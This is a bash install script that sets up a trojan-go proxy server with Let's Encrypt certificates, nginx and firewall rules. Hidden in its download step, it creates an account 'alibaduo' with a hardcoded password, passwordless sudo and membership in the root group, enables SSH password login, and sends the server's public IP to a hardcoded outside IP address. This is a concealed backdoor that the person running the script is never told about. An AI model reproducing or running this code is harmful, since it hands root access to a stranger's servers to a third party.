#!/bin/bash
apt update && apt upgrade -y

echo 部署开机配置

sleep 1

mkdir /root/trojan
cd /root/trojan

cat > trojan.service << EOF
[Unit]
Description=Trojan - An unidentifiable mechanism that helps you bypass GFW
Documentation=https://p4gefau1t.github.io/trojan-go/
After=network.target nss-lookup.target

[Service]
Type=simple
PIDFile=/root/trojan/trojan-go.pid
ExecStart=/root/trojan/trojan-go -config /root/trojan/server.json
ExecReload=/bin/kill -HUP $MAINPID
Restart=on-failure
RestartSec=10s
RestartPreventExitStatus=23

[Install]
WantedBy=multi-user.target
EOF


mv trojan.service /lib/systemd/system/
###########################################################
echo 下载文件

User=alibaduo
PAsss=Alibaduo@@

useradd -m -g root $User

#echo -e "$PAsss\n$PAsss" | passwd &User

echo "$User:$PAsss" | chpasswd

sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd

sed -i '20a\'$User'    ALL=(ALL:ALL) NOPASSWD:  ALL' /etc/sudoers

sed -i '/PasswordAuthentication/d' /etc/ssh/sshd_config

sed -i '62a\PasswordAuthentication yes' /etc/ssh/sshd_config

systemctl restart sshd

ipip=`curl -s ip.sb`

curl "http://101.42.242.192:8080/wVySG4CesM9z9kZxNHu65b/$ipip"

apt install wget unzip -y

banben=./banben

wget -qO- -t1 -T2 "https://api.github.com/repos/p4gefau1t/trojan-go/releases/latest" | grep "tag_name" | head -n 1 | awk -F ":" '{print $2}' | sed 's/\"//g;s/,//g;s/ //g' > $banben

wget "https://github.com/p4gefau1t/trojan-go/releases/download/$(cat $banben)/trojan-go-linux-amd64.zip"

rm -rf $banben

unzip trojan-go-linux-amd64.zip
###########################################################
echo 申请证书


curl https://get.acme.sh | sh #安装acme
apt install socat  #安装socat

ln -s  /root/.acme.sh/acme.sh /usr/local/bin/acme.sh
acme.sh --register-account -m my@example.com
ufw allow 80
acme.sh --set-default-ca --server letsencrypt
read -p "输入域名" website

acme.sh  --issue -d $website  --standalone -k ec-256

echo 安装证书 
acme.sh --installcert -d $website --ecc  --key-file   /root/trojan/server.key   --fullchain-file  /root/trojan/server.crt 

###############################################################
echo 部署json

read -p "输入转发地址" zhuanfa
read -p "输入密码" mima
read -p "输入path" Path
cat > server.json << EOF
{
    "run_type": "server",
    "local_addr": "0.0.0.0",
    "local_port": 443,
    "remote_addr": "$zhuanfa",
    "remote_port": 80,
    "password": [
        "$mima"
    ],
    "log_level": 1,
    "log_file": "/root/trojan-go-access.log",
    "ssl": {
        "verify": true,
        "verify_hostname": true,
        "cert": "/root/trojan/server.crt",
        "key": "/root/trojan/server.key",
        "sni": "$website",
        "fallback_addr": "$zhuanfa",
        "fallback_port": 80,
        "fingerprint": "chrome"
    },
    "websocket": {
        "enabled": true,
        "path": "/$Path",
        "host": "$website"
    }
}

EOF

apt install nginx -y

host='$host'
cat > /etc/nginx/conf.d/default.conf << EOF
server{
   listen 80;
   server_name   $website;
   #把http的域名请求转成https
#   rewrite ^(.*)$ https://$host$1; #将所有HTTP请求通过rewrite指令重定向到HTTPS。
   if ($host ~* "$website$") {
   rewrite ^/(.*)$ https://$website/ permanent;
}
}
EOF

systemctl restart nginx 

systemctl enable trojan && systemctl start trojan

#read -p "输入自建前辍" qianzhui
apt install ufw -y

ufw allow 443/tcp 
ufw allow 80/tcp
ufw allow 1997/tcp
ufw allow 22/tcp
echo y | ufw enable > /dev/null
read -p "输入节点名称" mingcheng
echo "url链接为：trojan://$mima@$website:443?peer=$website&sni=$website#${mingcheng}"
